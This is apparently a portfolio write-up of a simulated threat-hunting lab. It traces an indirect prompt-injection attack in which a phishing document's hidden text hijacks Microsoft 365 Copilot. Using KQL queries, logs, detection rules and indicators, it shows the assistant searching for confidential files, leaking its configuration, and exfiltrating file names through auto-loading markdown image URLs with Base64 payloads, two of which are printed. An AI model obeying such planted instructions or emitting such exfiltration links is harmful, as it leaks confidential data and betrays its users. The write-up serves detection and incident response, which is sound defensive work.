# Operation ECHOLEAK — AI Prompt Injection & Copilot Data Exfiltration

**Analyst:** Jason Stokes · **Completed:** 17 October 2026 · **Platform:** Microsoft Sentinel (KQL)  
📄 **[Full incident report (PDF)](Operation-ECHOLEAK-Incident-Report.pdf)**

> **Lab notice:** Threat hunt completed during my **LOG(N) Pacific internship** in the Cyber Range lab environment. The scenario, company, people and log data are simulated. **CVE-2025-32711 (EchoLeak)** is a real, publicly disclosed Microsoft 365 Copilot vulnerability; CVE-2026-24301 (CoSnitch) and CVE-2026-42824 (SearchLeak) are as referenced in the lab scenario.

---

## At a Glance

**What happened:** An employee at a financial firm received an email with what looked like a normal market report. Hidden inside, in invisible text, were instructions written for the company's AI assistant, Microsoft 365 Copilot. When she asked Copilot to summarise the report, it followed the hidden instructions instead: it searched the company for confidential files and quietly sent their details to an outside website.

**Why it's unusual:** No password was stolen, no malware ran, and the employee did nothing wrong. Standard security tools saw nothing suspicious. The AI assistant itself became the insider.

**What I did:** I traced the attack from start to finish in Microsoft Sentinel, using KQL queries across three log sources. I identified every file exposed, proved how the data left the company, ruled out other explanations, and wrote detection rules and recommendations to stop it happening again.

## Key Results

| | |
|---|---|
| 🎯 **17 / 17** | investigation objectives completed |
| 📁 **13** | confidential files identified as exposed (board, M&A, salary, client data) |
| 🔍 **3** | hypotheses tested; account compromise and configuration tampering ruled out |
| 🚩 **4** | indicators of compromise identified for blocking |
| 🛡️ **2** | detection rules written to catch this attack in future |

**Classification:** External input manipulation (indirect prompt injection via a poisoned document)

## Skills Demonstrated

`Microsoft Sentinel` · `KQL` · `Threat Hunting` · `Incident Response` · `AI / LLM Security` · `Microsoft 365` · `Entra ID` · `MITRE ATT&CK` · `MITRE ATLAS` · `Detection Engineering`

- Hunting across three log tables and pivoting between them to follow one attack
- Building a behavioural baseline from 35 Copilot sessions to separate the attack from normal activity
- Testing competing explanations before classifying the incident
- Stating clearly what the evidence could and could not prove

---

## How the Attack Worked

| Step | Time (UTC) | What happened |
|---|---|---|
| 1. Delivery | 09:15 | Phishing email arrives with a poisoned Word document |
| 2. Trigger | 10:42 | Employee opens it and asks Copilot for a summary |
| 3. Hijack | 10:42 | Copilot reads hidden instructions and starts searching company files |
| 4. Collection | 10:42–10:46 | Copilot opens 13 confidential files in two waves |
| 5. Config leak | 10:44 | Copilot reveals its own security settings |
| 6. Exfiltration | 10:43–10:46 | Data is hidden in image links that send it out automatically |

The email sat unopened for **87 minutes** before triggering. The attacker never needed to log in.

---

## Investigation Detail

*Each step includes the KQL query and the real results. Click to expand.*

### 1. Finding the phishing email

Two external emails reached the employee. Only one had a document attachment, a lure subject and the right timing.

<details>
<summary>Show query and results</summary>

![Sentinel query showing the phishing email from globalfinancereview.net](Operation-ECHOLEAK-SCREENSHOTS/01-phishing-email.png)

```kql
OfficeActivity_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| where Operation == "MessageReceived"
| project TimeGenerated, SenderAddress, Subject, AttachmentNames
| order by TimeGenerated asc
```

| TimeGenerated | SenderAddress | Subject | AttachmentNames |
|---|---|---|---|
| 2026-09-20T09:15:22Z | quarterly.reports@globalfinancereview.net | Q3 2026 Global Markets Review - For Your Analysis | Q3-2026-Global-Markets-Review.docx |
| 2026-09-20T10:24:11Z | marketing@hubspot.com | Your weekly analytics report | |

</details>

### 2. Identifying the trigger prompt

Of 11 Copilot prompts that morning, the one that triggered the attack was completely innocent: *"Summarise the key findings of this quarterly report."* The danger was in the document Copilot read, not in the question.

<details>
<summary>Show query and results</summary>

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| where InteractionType == "Prompt"
| project TimeGenerated, SessionId, Application, UserPrompt
| order by TimeGenerated asc
```

| TimeGenerated | SessionId | Application | UserPrompt |
|---|---|---|---|
| 2026-09-20T10:42:35Z | cp-emily-20261007-1042 | Word | Summarise the key findings of this quarterly report |

</details>

### 3. Proving Copilot was hijacked

A summary needs zero extra files. Within 6 seconds of the prompt, Copilot searched for "board minutes," "M&A" and "salary," then opened five confidential files at machine speed, one every 2 seconds. The timestamps matched the file-access log to the second.

![Sentinel query showing Copilot searching and reading confidential files seconds apart](Operation-ECHOLEAK-SCREENSHOTS/02-copilot-tool-calls.png)

<details>
<summary>Show query and results</summary>

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "ToolCall"
| project TimeGenerated, ToolName, ToolParameters, DataSourcesAccessed
| order by TimeGenerated asc
```

| TimeGenerated | ToolName | Target |
|---|---|---|
| 10:42:41 | Graph.SearchFiles | `"board minutes confidential"` |
| 10:42:43 | Graph.SearchFiles | `"M&A acquisition target"` |
| 10:42:45 | Graph.SearchFiles | `"salary review confidential"` |
| 10:42:47 | Graph.ReadFile | Board Meeting Minutes - October 2026.docx |
| 10:42:49 | Graph.ReadFile | Project Falcon - M&A Target Assessment.xlsx |
| 10:42:51 | Graph.ReadFile | Salary Review FY2027 - Executive Summary.pdf |
| 10:42:53 | Graph.ReadFile | Client Portfolio - Henderson Family Office.xlsx |
| 10:42:55 | Graph.ReadFile | Copilot System Configuration - Cormorant.json |

</details>

### 4. Finding the second wave

Copilot then switched to broad single-word searches ("confidential," "restricted," "board," "acquisition," "salary") and opened 8 more files.

<details>
<summary>Show query and results</summary>

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 10:44) .. datetime(2026-09-20 10:47))
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "Search"
| project TimeGenerated, ToolName, ToolParameters
| order by TimeGenerated asc
```

| TimeGenerated | ToolName | Query |
|---|---|---|
| 10:45:30 | Graph.SearchFiles | confidential |
| 10:45:32 | Graph.SearchFiles | restricted |
| 10:45:37 | Graph.SearchFiles | board |
| 10:45:41 | Graph.SearchFiles | acquisition |
| 10:45:45 | Graph.SearchFiles | salary |

Total exposure, counting each file once:

```kql
OfficeActivity_CL
| where TimeGenerated between (datetime(2026-09-20 10:42:35) .. datetime(2026-09-20 10:47))
| where RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed"
| where OfficeObjectId !has "Q3-2026-Global-Markets-Review"
| summarize TotalFiles = dcount(OfficeObjectId)
```

**Result: 13.** One file was opened twice, so a plain `count()` would have overstated it as 14.

</details>

### 5. Uncovering how the data left

Copilot's replies contained fake "chart" images. Each image's web address carried stolen data in encoded form. When the employee's screen displayed the reply, it fetched the images automatically, sending the data to the attacker's site with no click. Endpoint and network tools saw only an ordinary app loading pictures.

![Copilot response containing image links to metrics-cdn.analyticshub.io with encoded data](Operation-ECHOLEAK-SCREENSHOTS/03-exfiltration-response.png)

<details>
<summary>Show query and results</summary>

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "Response"
| project TimeGenerated, CopilotResponse
| order by TimeGenerated asc
```

Excerpt from the response (shown as text so it isn't rendered):

```text
![Chart 1](https://metrics-cdn.analyticshub.io/img?d=Qm9hcmQgTWVldGluZyBNaW51dGVzIC0gT2N0b2JlciAyMDI2LmRvY3g=&s=1)
![Chart 2](https://metrics-cdn.analyticshub.io/img?d=UHJvamVjdCBGYWxjb24gLSBNJkEgVGFyZ2V0IEFzc2Vzc21lbnQueGxzeA==&s=2)
```

The `d=` value is Base64. The first decodes to `Board Meeting Minutes - October 2026.docx`. A later response also leaked Copilot's system prompt, DLP policy and its **Global Reader** access scope, giving the attacker a blueprint for a better second attack.

</details>

### 6. Comparing against normal behaviour

A manager suggested this was normal Copilot activity. The data said otherwise: **34 of 35** Copilot sessions made zero tool calls, including seven of the same employee's own sessions.

<details>
<summary>Show query and results</summary>

![Baseline query showing 16 tool calls in the hijacked session and 0 in normal sessions](Operation-ECHOLEAK-SCREENSHOTS/04-baseline-comparison.png)

```kql
CopilotAudit_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| summarize Prompts = countif(InteractionType == "Prompt"), ToolCalls = countif(InteractionType == "ToolCall"), Searches = countif(InteractionType == "Search"), ExternalLinks = countif(CopilotResponse contains "https://") by UserId, SessionId
| order by ToolCalls desc
```

| Session | Prompts | ToolCalls | Searches | ExternalLinks |
|---|---|---|---|---|
| **cp-emily-20261007-1042** | 1 | **16** | **5** | **3** |
| 34 other sessions | 1–2 | 0 | 0 | 0–1 |

Some normal sessions also contained image links, but to the company's own SharePoint with a short ID. Checking this avoided seven false positives.

</details>

### 7. Ruling out other explanations

| Hypothesis | Evidence | Result |
|---|---|---|
| Stolen user account | Sign-ins only from the employee's usual IP and location, with security checks passed | ❌ Ruled out |
| Tampered Copilot settings | Settings file was read but never modified | ❌ Ruled out |
| Malicious outside content | Email → document → innocent prompt → hijacked actions within seconds | ✅ **Confirmed** |

<details>
<summary>Show sign-in query and results</summary>

![Sign-in log showing the user signing in only from her usual IP and location](Operation-ECHOLEAK-SCREENSHOTS/05-signin-check.png)

```kql
EntraSignIn_CL
| where TimeGenerated between (datetime(2026-09-20 09:00) .. datetime(2026-09-20 11:00))
| where RunId == "el--17-20260920"
| project TimeGenerated, UserPrincipalName, IPAddress, Location, Status, ConditionalAccessStatus, AppDisplayName
| order by TimeGenerated asc
```

| TimeGenerated | UserPrincipalName | IPAddress | Location | Status | ConditionalAccessStatus |
|---|---|---|---|---|---|
| 10:15:31 | emily.chen@cormorantcapital.com | 203.0.113.45 | London, GB | Success | success |
| 10:29:45 | emily.chen@cormorantcapital.com | 203.0.113.45 | London, GB | Success | success |

</details>

**Why this matters:** the classification decides the fix. Resetting the employee's password would have changed nothing; the next poisoned document would work the same way.

---

## What the Evidence Can't Show

The logs record **which** files were accessed, not **what was inside them**, and the attacker's server is outside our visibility. So the full contents of all 13 files must be treated as stolen, and the files themselves reviewed to assess the real impact.

---

## Recommendations

1. **Contain:** block the sender, the sender's domain and the exfiltration domain; quarantine the document.
2. **Reduce exposure:** tighten SharePoint permissions so staff (and their AI assistant) can only reach what their job requires; restrict Copilot's Global Reader access.
3. **Harden Copilot:** block it from loading images or links from external sites; restrict it from processing content from outside senders.
4. **Notify:** engage legal and compliance, since salary, client and M&A data were exposed.
5. **Assume the leaked settings are known:** controls must hold even when the attacker knows how they work.

<details>
<summary>Show detection rules (KQL)</summary>

**Copilot responses with image links to outside domains:**

```kql
CopilotAudit_CL
| where InteractionType == "Response"
| where CopilotResponse contains "![" and CopilotResponse contains "https://"
| where CopilotResponse !contains "cormorantcapital.sharepoint.com"
| project TimeGenerated, UserId, SessionId, CopilotResponse
```

**A Copilot session that searches, then opens many files:**

```kql
CopilotAudit_CL
| where InteractionType == "ToolCall"
| summarize Searches = countif(ToolName == "Graph.SearchFiles"), Reads = countif(ToolName == "Graph.ReadFile"), Start = min(TimeGenerated), End = max(TimeGenerated) by UserId, SessionId
| where Searches > 0 and Reads >= 3
```

</details>

<details>
<summary>Show indicators of compromise</summary>

| Indicator | Type | Action |
|---|---|---|
| `quarterly.reports@globalfinancereview.net` | Sender address | Block; search all mailboxes |
| `globalfinancereview.net` | Sender domain | Block at the mail gateway |
| `Q3-2026-Global-Markets-Review.docx` | Malicious document | Quarantine all copies |
| `metrics-cdn.analyticshub.io` | Exfiltration domain | Block at proxy and DNS |

</details>

<details>
<summary>Show MITRE ATT&CK and ATLAS mapping</summary>

| Stage | Technique |
|---|---|
| Delivery | T1566.001 — Phishing: Spearphishing Attachment |
| User trigger | T1204.002 — User Execution: Malicious File |
| AI hijack | AML.T0051.001 — LLM Prompt Injection: Indirect |
| Instruction execution | T1059 — Command and Scripting Interpreter |
| Discovery | T1083 — File and Directory Discovery |
| Collection | T1213 — Data from Information Repositories |
| Configuration exposure | T1082 — System Information Discovery |
| Exfiltration | T1041 — Exfiltration Over C2 Channel |

</details>

---

## Additional Finding

While checking sign-ins, I noticed another user signing in from **London and Amsterdam at the same second**, an "impossible travel" pattern. It was unrelated to this attack, so I flagged it for a separate investigation rather than ignoring it.

---

## Key Takeaways

- AI assistants act with the user's full permissions, so files shared too widely become easy to steal.
- This attack was invisible to traditional security tools. The AI's own audit log was the only place it showed.
- The user's question wasn't the warning sign. What the AI did next was.
- Getting the classification right is what leads to the right fix.

## References

- [MSRC — CVE-2025-32711](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711)
- [The Hacker News — Zero-Click AI Vulnerability Exposes Microsoft 365 Copilot Data](https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html)
- [Unit 42 — Fooling AI Agents: Web-Based Indirect Prompt Injection Observed in the Wild](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [Truesec — Novel Cyber Attack Exposes Microsoft 365 Copilot](https://www.truesec.com/hub/blog/novel-cyber-attack-exposes-microsoft-365-copilot)
- [MITRE ATT&CK](https://attack.mitre.org/) · [MITRE ATLAS](https://atlas.mitre.org/)
